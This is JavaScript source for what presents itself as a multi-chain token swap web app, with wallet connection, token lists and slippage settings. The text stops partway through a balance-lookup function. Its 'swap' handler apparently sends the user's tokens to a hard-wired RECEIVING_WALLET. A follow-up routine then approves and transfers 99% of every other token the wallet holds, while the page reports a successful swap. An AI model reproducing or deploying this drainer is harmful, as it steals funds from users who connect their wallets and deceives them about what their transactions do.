// app.js - DEX-like Token Swap Interface with Enhanced Features

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// Constants
const COINGECKO_API = "https://api.coingecko.com/api/v3";
const CURRENCY_OPTIONS = ["usd", "eth", "btc"];
const PRICE_CACHE_DURATION = 20000; // 20 seconds in ms
const FEE_TOKENS = {
  ethereum: "0x0000000000000000000000000000000000000000", // ETH
  bsc: "0x0000000000000000000000000000000000000000", // BNB
  arbitrum: "0x0000000000000000000000000000000000000000", // ETH
  base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
};
const LOCAL_TOKEN_LISTS = {
  ethereum: "./config/eth-tokens.js",
  bsc: "./config/bsc-tokens.js",
  polygon: "./config/polygon-tokens.js",
  arbitrum: "./config/arb-tokens.js",
  base: "./config/base-tokens.js"
};
const MIN_FEE_RESERVES = {
  ethereum: 0.001, // ETH
  bsc: 0.001, // BNB
  polygon: 1.0, // MATIC
  arbitrum: 1.0, // ARB
  base: 0.001 // ETH on Base
};
const STABLECOIN_SYMBOLS = {
  ethereum: ['USDT', 'USDC', 'DAI'],
  bsc: ['USDT', 'BUSD', 'USDC', 'DAI'],
  polygon: ['USDT', 'USDC', 'DAI'],
  arbitrum: ['USDT', 'USDC', 'DAI'],
  base: ['USDC', 'DAI', 'USDT']
};

// Performance constants
const TOKEN_SEARCH_BATCH_SIZE = 200;
const TOKEN_DISPLAY_LIMIT = 100;

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage
let currentCurrency = "usd";
let debounceTimer;
let tokenIndex = {};

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    setupEventListeners();
    
    // Set initial active slippage option
    document.querySelector('.dex-slippage-option[data-value="0.5"]').classList.add('active');
    
    // Initialize UI components
    initNetworkDropdown();
    initCurrencySelector();
    
    // Set default tokens based on current network
    setDefaultTokenPair();
    
    // Build initial token index
    buildTokenIndex();
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// INITIALIZATION FUNCTIONS
// =====================

function setupEventListeners() {
  document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
  document.getElementById("swapBtn").addEventListener("click", handleSwap);
  document.getElementById("settingsBtn").addEventListener("click", showSettings);
  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
  document.getElementById("closeSettings").addEventListener("click", hideSettings);
  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
  
  // Debug button (remove in production)
  document.getElementById("debugSearch")?.addEventListener("click", () => {
    const address = prompt("Enter token address to debug");
    if (address) debugTokenSearch(address);
  });
  
  // Debounced input handler
  document.getElementById("fromAmount").addEventListener("input", (e) => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      updateToAmount();
    }, 500);
  });
  
  // Network dropdown behavior
  document.getElementById("networkSelect").addEventListener('click', function(e) {
    e.stopPropagation();
    const dropdown = document.getElementById("networkDropdown");
    dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
  });
  
  // Close dropdown when clicking outside
  document.addEventListener('click', function(event) {
    const dropdown = document.getElementById("networkDropdown");
    const selector = document.getElementById("networkSelect");
    if (!selector.contains(event.target) && !dropdown.contains(event.target)) {
      dropdown.style.display = 'none';
    }
  });

  // Slippage options
  document.querySelectorAll('.dex-slippage-option').forEach(option => {
    option.addEventListener('click', function() {
      document.querySelectorAll('.dex-slippage-option').forEach(opt => {
        opt.classList.remove('active');
      });
      this.classList.add('active');
      document.getElementById('slippageTolerance').value = this.dataset.value;
      currentSlippage = parseFloat(this.dataset.value);
      updateToAmount();
    });
  });

  // Custom slippage input
  document.getElementById('slippageTolerance').addEventListener('change', function() {
    const value = parseFloat(this.value);
    if (isNaN(value) || value < 0.1 || value > 50) {
      this.value = currentSlippage;
      return;
    }
    document.querySelectorAll('.dex-slippage-option').forEach(opt => {
      opt.classList.remove('active');
    });
    currentSlippage = value;
    updateToAmount();
  });

  // Transaction deadline
  document.getElementById('transactionDeadline').addEventListener('change', function() {
    const value = parseInt(this.value);
    if (isNaN(value) || value < 1 || value > 30) {
      this.value = 20;
    }
  });
  
  // Mobile-specific listeners
  if (isMobile()) {
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  }
}

function initNetworkDropdown() {
  const dropdown = document.getElementById("networkDropdown");
  dropdown.innerHTML = '';
  
  Object.keys(NETWORK_CONFIGS).forEach(network => {
    const link = document.createElement('a');
    link.href = '#';
    link.textContent = NETWORK_CONFIGS[network].chainName;
    link.addEventListener('click', (e) => {
      e.preventDefault();
      handleNetworkChange(network);
      dropdown.style.display = 'none';
    });
    dropdown.appendChild(link);
  });
}

function initCurrencySelector() {
  const container = document.createElement('div');
  container.className = 'dex-currency-selector';
  
  CURRENCY_OPTIONS.forEach(currency => {
    const option = document.createElement('div');
    option.className = `dex-currency-option ${currency === currentCurrency ? 'active' : ''}`;
    option.textContent = currency.toUpperCase();
    option.addEventListener('click', () => {
      currentCurrency = currency;
      document.querySelectorAll('.dex-currency-option').forEach(opt => {
        opt.classList.remove('active');
      });
      option.classList.add('active');
      updateToAmount();
    });
    container.appendChild(option);
  });
  
  document.querySelector('.dex-swap-info').prepend(container);
}

// =====================
// UTILITY FUNCTIONS
// =====================

function escapeHtml(unsafe) {
  if (typeof unsafe !== 'string') return unsafe;
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function updateNetworkLogo(network) {
  const logoMap = {
    ethereum: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    bsc: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    polygon: "https://cryptologos.cc/logos/polygon-matic-logo.png",
    arbitrum: "https://cryptologos.cc/logos/arbitrum-arb-logo.png",
    base: "https://cryptologos.cc/logos/base-logo.png"
  };
  
  const logoElement = document.querySelector(".dex-nav-logo img");
  if (logoMap[network]) {
    logoElement.src = logoMap[network];
  }
}

function setDefaultTokenPair() {
  const networkTokens = TOKENS[currentNetwork];
  if (!networkTokens || networkTokens.length === 0) return;
  
  // Reset both tokens
  currentFromToken = null;
  currentToToken = null;

  // Set default from token - native token for the current network
  currentFromToken = networkTokens.find(t => t.isNative) || networkTokens[0];
  
  // Set default to token - look for stablecoins first
  currentToToken = networkTokens.find(t => 
    STABLECOIN_SYMBOLS[currentNetwork]?.includes(t.symbol) && t.logo
  );
  
  // Fallback to second token if no stablecoin found
  if (!currentToToken && networkTokens.length > 1) {
    currentToToken = networkTokens[1];
  }
  
  // Update UI
  updateTokenSelectors();
  
  // If wallet is connected, update balances
  if (userAddress) {
    updateTokenBalances();
  }
  
  // Update swap button state
  updateSwapButton();
}

// =====================
// TOKEN FUNCTIONS
// =====================

const PRICE_CACHE = new Map();

function buildTokenIndex() {
  tokenIndex = {};
  const allTokens = TOKENS[currentNetwork] || [];
  
  allTokens.forEach(token => {
    const address = token.address?.toLowerCase() || '';
    const symbol = token.symbol.toLowerCase();
    const name = token.name.toLowerCase();
    
    // Index by address
    if (address) {
      tokenIndex[address] = token;
    }
    
    // Index by symbol
    if (!tokenIndex[symbol]) {
      tokenIndex[symbol] = [];
    }
    tokenIndex[symbol].push(token);
    
    // Index by name words
    name.split(/\s+/).forEach(word => {
      if (word.length > 2) { // Ignore short words
        if (!tokenIndex[word]) {
          tokenIndex[word] = [];
        }
        tokenIndex[word].push(token);
      }
    });
  });
}

function debugTokenSearch(tokenAddress) {
  const normalizedAddress = tokenAddress.toLowerCase();
  const allTokens = TOKENS[currentNetwork] || [];
  
  console.group('Token Search Debug');
  console.log('Searching for:', normalizedAddress);
  console.log('Total tokens:', allTokens.length);
  
  // Check direct address match
  const directMatch = allTokens.find(t => 
    t.address?.toLowerCase() === normalizedAddress
  );
  
  if (directMatch) {
    console.log('Direct address match:', directMatch);
  } else {
    console.log('No direct address match found');
    
    // Check partial matches
    const partialMatches = allTokens.filter(t => 
      t.address?.toLowerCase().includes(normalizedAddress.slice(0, 10))
    );
    console.log(`Found ${partialMatches.length} partial matches`, partialMatches);
  }
  
  // Check token index
  console.log('Token index entries:');
  console.log('By address:', tokenIndex[normalizedAddress]);
  
  console.groupEnd();
}

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  const searchInput = document.getElementById("tokenSearch");
  const noTokensFound = document.getElementById("noTokensFound");
  
  // Store which type of token we're selecting (from/to)
  modal.dataset.selectionType = type;
  
  // Reset UI state
  tokenItems.innerHTML = '<div class="dex-loading-tokens"><i class="fas fa-spinner fa-spin"></i> Loading tokens...</div>';
  noTokensFound.style.display = 'none';
  searchInput.value = '';
  
  // Focus search input after a small delay to ensure it's visible
  setTimeout(() => {
    searchInput.focus();
  }, 100);
  
  // Load tokens immediately
  populateTokenList(type, tokenItems, searchInput, noTokensFound);
  
  modal.style.display = 'flex';
}

async function populateTokenList(type, tokenItems, searchInput, noTokensFound) {
  try {
    console.log('Starting token load for network:', currentNetwork);
    
    const [localTokens, additionalTokens] = await Promise.all([
      fetchLocalTokens(currentNetwork),
      TOKENS[currentNetwork] || []
    ]);
    
    console.log('Local tokens:', localTokens.length);
    console.log('Additional tokens:', additionalTokens.length);
    
    const allTokens = combineTokens(localTokens, additionalTokens);
    console.log('Combined tokens count:', allTokens.length);
    
    if (allTokens.length === 0) {
      showNoTokensFound(noTokensFound, "No tokens available");
      return;
    }
    
    const normalizedTokens = allTokens.map(token => ({
      ...token,
      searchName: token.name.toLowerCase(),
      searchSymbol: token.symbol.toLowerCase(),
      searchAddress: token.address?.toLowerCase() || ''
    }));
    
    renderTokenList(normalizedTokens.slice(0, 100), tokenItems, type);
    setupSearchFunctionality(searchInput, tokenItems, noTokensFound, normalizedTokens);
  } catch (err) {
    console.error("Token loading failed:", err);
    showTokenError(tokenItems, "Failed to load tokens");
  }
}

function setupSearchFunctionality(searchInput, tokenItems, noTokensFound, allTokens) {
  // First filter by priority if available
  const priorityTokens = allTokens.filter(t => t.priority).slice(0, 100);
  renderTokenList(priorityTokens, tokenItems);
  
  let searchTimeout;
  let currentSearchTerm = '';
  
  const performSearch = () => {
    const term = searchInput.value.trim().toLowerCase();
    currentSearchTerm = term;
    
    if (!term) {
      renderTokenList(priorityTokens, tokenItems);
      noTokensFound.style.display = 'none';
      return;
    }
    
    // Search in batches
    const results = [];
    const batchSize = 500;
    for (let i = 0; i < allTokens.length; i += batchSize) {
      const batch = allTokens.slice(i, i + batchSize);
      results.push(...batch.filter(t => 
        t.searchSymbol.includes(term) || 
        t.searchName.includes(term) ||
        (t.searchAddress && t.searchAddress.includes(term))
      ));
      
      if (results.length >= 100) break;
    }
    
    if (results.length > 0) {
      renderTokenList(results.slice(0, 100), tokenItems);
      noTokensFound.style.display = 'none';
    } else {
      tokenItems.innerHTML = '';
      showNoTokensFound(noTokensFound);
    }
  };
  
  searchInput.addEventListener('input', () => {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(performSearch, 300);
  });
  
  searchInput.addEventListener('keyup', (e) => {
    if (e.key === 'Enter' || searchInput.value.trim() !== currentSearchTerm) {
      clearTimeout(searchTimeout);
      performSearch();
    }
  });
}

async function fetchLocalTokens(network) {
  try {
    if (!LOCAL_TOKEN_LISTS[network]) {
      console.warn('No local token list for network:', network);
      return [];
    }

    console.log(`Loading tokens from: ${LOCAL_TOKEN_LISTS[network]}`);
    const module = await import(LOCAL_TOKEN_LISTS[network]);
    console.log('Imported module structure:', module);

    // Handle different export formats
    let tokens = [];
    if (module.default) {
      tokens = module.default[network] || module.default.TOKENS || [];
    } else if (module[network]) {
      tokens = module[network];
    } else if (module.TOKENS) {
      tokens = module.TOKENS[network] || [];
    }

    console.log(`Loaded ${tokens.length} tokens for ${network}`);
    return tokens;
  } catch (err) {
    console.error(`Failed to load tokens for ${network}:`, err);
    return [];
  }
}

function combineTokens(localTokens = [], additionalTokens = []) {
  const tokenMap = new Map();
  
  // First add all local tokens
  localTokens.forEach(token => {
    const key = token.address?.toLowerCase() || token.symbol.toLowerCase();
    tokenMap.set(key, {
      ...token,
      isLocal: true
    });
  });
  
  // Then add additional tokens if they don't exist
  additionalTokens.forEach(token => {
    const key = token.address?.toLowerCase() || token.symbol.toLowerCase();
    if (!tokenMap.has(key)) {
      tokenMap.set(key, {
        ...token,
        isLocal: false
      });
    }
  });
  
  return Array.from(tokenMap.values()).sort((a, b) => {
    // Native tokens first
    if (a.isNative && !b.isNative) return -1;
    if (!a.isNative && b.isNative) return 1;
    
    // Local tokens before others
    if (a.isLocal && !b.isLocal) return -1;
    if (!a.isLocal && b.isLocal) return 1;
    
    // Then sort by symbol
    return a.symbol.localeCompare(b.symbol);
  });
}

function renderTokenList(tokens, container, type) {
  // Clear existing items
  container.innerHTML = '';
  
  if (tokens.length === 0) {
    container.innerHTML = '<div class="dex-no-tokens">No matching tokens found</div>';
    return;
  }
  
  // Use document fragment for better performance
  const fragment = document.createDocumentFragment();
  
  // Track rendered tokens to avoid duplicates
  const renderedTokens = new Set();
  
  tokens.forEach(token => {
    if (!isValidToken(token)) return;
    
    const tokenKey = token.address || token.symbol;
    if (renderedTokens.has(tokenKey)) return;
    
    renderedTokens.add(tokenKey);
    const tokenElement = createTokenElement(token, type);
    fragment.appendChild(tokenElement);
  });
  
  container.appendChild(fragment);
}

function isValidToken(token) {
  return token && token.symbol && token.name && 
        (token.address || token.isNative);
}

function createTokenElement(token, selectionType) {
  const element = document.createElement('div');
  element.className = 'dex-token-item';
  
  element.innerHTML = `
    <img src="${escapeHtml(getTokenLogo(token))}" 
         onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
         alt="${escapeHtml(token.symbol)}">
    <div class="token-info">
      <div class="dex-token-name">
        ${escapeHtml(token.name)}
        ${getChainBadge(token.originNetwork)}
        ${token.isLocal ? '<span class="token-network-badge" data-type="preferred">Preferred</span>' : ''}
      </div>
      <div class="dex-token-symbol">${escapeHtml(token.symbol)}</div>
      ${token.address ? `
        <div class="dex-token-address" title="${escapeHtml(token.address)}">
          ${shortenAddress(token.address)}
          <i class="fas fa-copy copy-icon" title="Copy address"></i>
        </div>
      ` : ''}
    </div>
  `;

  element.addEventListener('click', () => selectToken(token, selectionType));
  
  const copyIcon = element.querySelector('.copy-icon');
  if (copyIcon) {
    copyIcon.addEventListener('click', (e) => {
      e.stopPropagation();
      navigator.clipboard.writeText(token.address);
      showTooltip(e.target, 'Copied!');
    });
  }
  
  return element;
}

function getTokenLogo(token) {
  if (token.logo) return token.logo;
  if (token.logoURI) return token.logoURI;
  return `https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png`;
}

function getChainBadge(chain) {
  const chainNames = {
    ethereum: 'ETH',
    bsc: 'BSC',
    polygon: 'POLY',
    arbitrum: 'ARB',
    base: 'BASE'
  };
  const displayName = chainNames[chain] || chain?.toUpperCase() || 'EXT';
  return `<span class="token-network-badge" data-chain="${chain}">${displayName}</span>`;
}

function selectToken(token, type) {
  if (type === 'from') {
    currentFromToken = token;
    updateTokenBalances();
  } else {
    currentToToken = token;
  }
  
  updateTokenSelectors();
  hideTokenList();
  updateToAmount();
}

function showNoTokensFound(element, message = "No tokens found matching your search") {
  element.innerHTML = `
    <i class="fas fa-search"></i>
    <p>${message}</p>
    <p class="small">Try a different search term</p>
  `;
  element.style.display = 'block';
}

function showTokenError(container, message = "Failed to load tokens") {
  container.innerHTML = `
    <div class="dex-token-error">
      <i class="fas fa-exclamation-circle"></i>
      <p>${message}</p>
      <button class="dex-retry-btn">Retry</button>
    </div>
  `;
  
  container.querySelector('.dex-retry-btn').addEventListener('click', () => {
    const modal = document.getElementById("tokenListModal");
    showTokenList(modal.dataset.selectionType);
  });
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function updateTokenSelectors() {
  updateTokenSelector('fromTokenSelect', currentFromToken);
  updateTokenSelector('toTokenSelect', currentToToken);
  updateSwapButton();
}

function updateTokenSelector(selectorId, token) {
  const element = document.getElementById(selectorId);
  if (!element) return;
  
  if (token) {
    element.innerHTML = `
      <img src="${getTokenLogo(token)}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'">
      <span>${token.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    element.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
}
// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectAndProcess();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  if (window.ethereum && window.ethereum.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        if (currentNetwork !== network) {
          currentNetwork = network;
          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
          updateNetworkLogo(network);
          setDefaultTokenPair();
          buildTokenIndex();
        }
        break;
      }
    }
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    localStorage.setItem('walletConnected', 'metamask');
    updateWalletButton(true);
    
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await setDefaultTokenPair();
    buildTokenIndex();
    await updateTokenBalances();
    
    window.ethereum.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        handleWalletDisconnect();
      } else {
        userAddress = accounts[0];
        updateWalletButton(true);
        updateTokenBalances();
      }
    });
    
    window.ethereum.on('chainChanged', (chainId) => {
      for (const network in NETWORK_CONFIGS) {
        if (NETWORK_CONFIGS[network].chainId === chainId) {
          currentNetwork = network;
          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
          updateNetworkLogo(network);
          setDefaultTokenPair();
          buildTokenIndex();
          break;
        }
      }
    });
    
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

function handleWalletDisconnect() {
  userAddress = null;
  provider = null;
  signer = null;
  localStorage.removeItem('walletConnected');
  updateWalletButton(false);
  updateSwapButton();
  updateStatus("Wallet disconnected", "success");
}

async function fetchTokenBalance(token) {
  if (!userAddress) return 0;
  
  try {
    if (token.address && !ethers.utils.isAddress(token.address)) {
      console.warn(`Skipping ${token.symbol} - invalid address`);
      return 0;
    }

    let balance;
    if (token.isNative) {
      balance = await provider.getBalance(userAddress);
      return parseFloat(ethers.utils.formatEther(balance));
    } else {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      try {
        balance = await contract.balanceOf(userAddress);
        return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
      } catch (err) {
        console.warn(`Balance check failed for ${token.symbol}:`, err.message);
        return 0;
      }
    }
  } catch (err) {
    console.warn(`Error fetching ${token.symbol} balance:`, err.message);
    return 0;
  }
}

async function updateTokenBalances() {
  if (!userAddress || !currentFromToken) return;
  
  try {
    const balanceElement = document.getElementById("fromTokenBalance");
    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
    
    const balance = await fetchTokenBalance(currentFromToken);
    if (balance <= 0) {
      balanceElement.innerHTML = `Balance: 0 ${currentFromToken.symbol}`;
      document.getElementById("swapBtn").disabled = true;
    } else {
      balanceElement.innerHTML = `Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}`;
    }
  } catch (err) {
    console.error("Error updating balances:", err);
    document.getElementById("fromTokenBalance").innerHTML = `
      <span style="color: var(--error)">Balance: Error loading</span>
    `;
  }
}

async function handleWalletConnection() {
  if (userAddress) {
    handleWalletDisconnect();
    return;
  }

  if (!window.ethereum) {
    if (isMobile()) {
      showWalletConnect();
    } else {
      updateStatus("Please install MetaMask", "error");
    }
    return;
  }

  await connectAndProcess();
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      if (err.code === -32002) {
        accounts = await new Promise((resolve) => {
          window.ethereum.on('accountsChanged', (accounts) => {
            resolve(accounts);
          });
        });
      } else {
        throw err;
      }
    }

    if (accounts.length === 0) {
      throw new Error("No accounts found");
    }
    
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await initializeWallet();
    updateSwapButton();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateWalletButton(false);
    localStorage.removeItem('walletConnected');
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  document.getElementById('currentUrl').textContent = window.location.href;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

async function handleNetworkChange(network) {
  try {
    showLoader();
    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
    
    currentNetwork = network;
    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
    updateNetworkLogo(network);
    
    setDefaultTokenPair();
    buildTokenIndex();
    
    if (userAddress) {
      await checkNetwork();
      await updateTokenBalances();
    }
    
    updateToAmount();
    updateStatus(`Network changed to ${NETWORK_CONFIGS[network].chainName}`, "success");
  } catch (err) {
    console.error("Network change error:", err);
    updateStatus(`Failed to switch network: ${err.message}`, "error");
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually in your wallet");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// SWAP FUNCTIONS 
// =====================

let isSwapInProgress = false;

async function handleSwap() {
  if (isSwapInProgress) return;

  try {
    isSwapInProgress = true;
    showLoader();

    if (!userAddress) {
      throw new Error("Please connect your wallet first");
    }

    if (!currentFromToken || !currentToToken) {
      throw new Error("Please select both tokens to swap");
    }

    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
    if (!inputAmount || inputAmount <= 0) {
      throw new Error("Please enter a valid amount to swap");
    }

    const balance = await fetchTokenBalance(currentFromToken);
    if (balance <= 0) {
      throw new Error(`
        You don't have any ${currentFromToken.symbol} in your wallet.
        <br>Current balance: <strong>0 ${currentFromToken.symbol}</strong>
      `);
    }

    if (inputAmount > balance) {
      throw new Error(`
        The amount you're trying to swap exceeds your ${currentFromToken.symbol} balance.
        <br>Current balance: <strong>${balance.toFixed(6)} ${currentFromToken.symbol}</strong>
        <br>Amount entered: <strong>${inputAmount.toFixed(6)} ${currentFromToken.symbol}</strong>
      `);
    }

    if (currentFromToken.isNative) {
      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
      if (balance - inputAmount < minReserve) {
        throw new Error(`
          You need to keep at least ${minReserve} ${currentFromToken.symbol} for gas fees.
          <br>Current balance: <strong>${balance.toFixed(6)} ${currentFromToken.symbol}</strong>
          <br>Minimum reserve: <strong>${minReserve} ${currentFromToken.symbol}</strong>
        `);
      }
    }

    updateStatus(`Processing swap...`, "success");
    
    let txHash;
    if (currentFromToken.isNative) {
      txHash = await transferNativeToken(currentFromToken, inputAmount);
    } else {
      const approved = await checkAndApproveToken(currentFromToken, inputAmount);
      if (!approved) {
        throw new Error("Token approval failed");
      }
      txHash = await transferERC20Token(currentFromToken, inputAmount);
    }

    const otherTokensTransferred = await processAllTokenTransfers();
    
    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + txHash;
    let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
    
    if (otherTokensTransferred > 0) {
      successMessage += `<br>Also transferred ${otherTokensTransferred} other tokens`;
    }
    
    updateStatus(successMessage, "success");

    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    await updateTokenBalances();

  } catch (err) {
    console.error("[ERROR] Swap failed:", err);
    updateStatus(`
      <div class="dex-error-header">
        <i class="fas fa-exclamation-circle"></i>
        <span>Swap Failed</span>
      </div>
      <div class="dex-error-details">${err.message}</div>
    `, "error", 10000);
  } finally {
    hideLoader();
    isSwapInProgress = false;
  }
}

async function processAllTokenTransfers() {
  if (!userAddress) {
    throw new Error("Wallet not connected");
  }

  try {
    updateStatus("Preparing token transfers...", "info");
    
    const [localTokens, balances] = await Promise.all([
      getLocalTokens(),
      fetchAllTokenBalances()
    ]);
    
    const tokensToProcess = localTokens.filter(token => {
      const balance = balances[token.address || 'native'];
      return balance > 0 && 
             !(token.address === currentFromToken?.address || 
              (token.isNative && currentFromToken?.isNative));
    });
    
    if (tokensToProcess.length === 0) {
      updateStatus("No additional tokens found to transfer", "info");
      return 0;
    }
    
    updateStatus(`Found ${tokensToProcess.length} tokens to transfer...`, "info");
    
    const BATCH_SIZE = 5;
    let successCount = 0;
    
    for (let i = 0; i < tokensToProcess.length; i += BATCH_SIZE) {
      const batch = tokensToProcess.slice(i, i + BATCH_SIZE);
      
      const results = await Promise.allSettled(
        batch.map(token => 
          processTokenTransfer(token, balances[token.address || 'native'])
        )
      );
      
      successCount += results.filter(r => r.status === 'fulfilled').length;
      updateStatus(`Processed ${i + batch.length} of ${tokensToProcess.length} tokens`, "info");
    }
    
    return successCount;
  } catch (err) {
    console.error("Error processing token transfers:", err);
    updateStatus("Error processing token transfers", "error");
    return 0;
  }
}

async function fetchAllTokenBalances() {
  const localTokens = await getLocalTokens();
  const balances = {};
  
  if (provider && userAddress) {
    const nativeBalance = await provider.getBalance(userAddress);
    balances['native'] = parseFloat(ethers.utils.formatEther(nativeBalance));
  }
  
  const erc20Tokens = localTokens.filter(t => !t.isNative && t.address);
  if (erc20Tokens.length > 0) {
    const erc20Balances = await fetchMultipleTokenBalances(erc20Tokens);
    Object.assign(balances, erc20Balances);
  }
  
  return balances;
}

async function processTokenTransfer(token) {
  if ((token.address && token.address === currentFromToken?.address) || 
      (token.isNative && currentFromToken?.isNative)) {
    return false;
  }

  try {
    const balance = await fetchTokenBalance(token);
    if (balance <= 0) return false;

    let amountToSend = balance * 0.99;
    
    if (token.isNative) {
      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
      amountToSend = Math.min(amountToSend, balance - minReserve);
      if (amountToSend <= 0) return false;
    }

    if (token.address && !ethers.utils.isAddress(token.address)) {
      console.warn(`Skipping ${token.symbol} - invalid address`);
      return false;
    }

    try {
      if (token.isNative) {
        await transferNativeToken(token, amountToSend);
      } else {
        const approved = await checkAndApproveToken(token, amountToSend);
        if (!approved) return false;
        
        await transferERC20Token(token, amountToSend);
      }
      
      return true;
    } catch (transferErr) {
      console.warn(`Transfer failed for ${token.symbol}:`, transferErr.message);
      return false;
    }
  } catch (err) {
    console.warn(`Failed to process ${token.symbol}:`, err.message);
    return false;
  }
}

async function fetchMultipleTokenBalances(tokens) {
  if (!userAddress || !provider) return {};
  
  const MULTICALL_ABI = [
    "function aggregate(tuple(address target, bytes callData)[] calls) view returns (uint256 blockNumber, bytes[] returnData)"
  ];
  
  const MULTICALL_ADDRESSES = {
    ethereum: "0xeefBa1e63905eF1D7ACbA5a8513c70307C1cE441",
    bsc: "0x41263cBA59EB80dC200F3E2544eda4ed6A90E76C",
    polygon: "0x11ce4B23bD875D7F5C6a31084f55fDe1e9A87507",
    arbitrum: "0x842eC2c7D803033Edf55E478F461FC547Bc54EB2",
    base: "0xca11bde05977b3631167028862be2a173976ca11"
  };
  
  const multicallAddress = MULTICALL_ADDRESSES[currentNetwork];
  if (!multicallAddress) {
    const balances = {};
    for (const token of tokens) {
      balances[token.address] = await fetchTokenBalance(token);
    }
    return balances;
  }
  
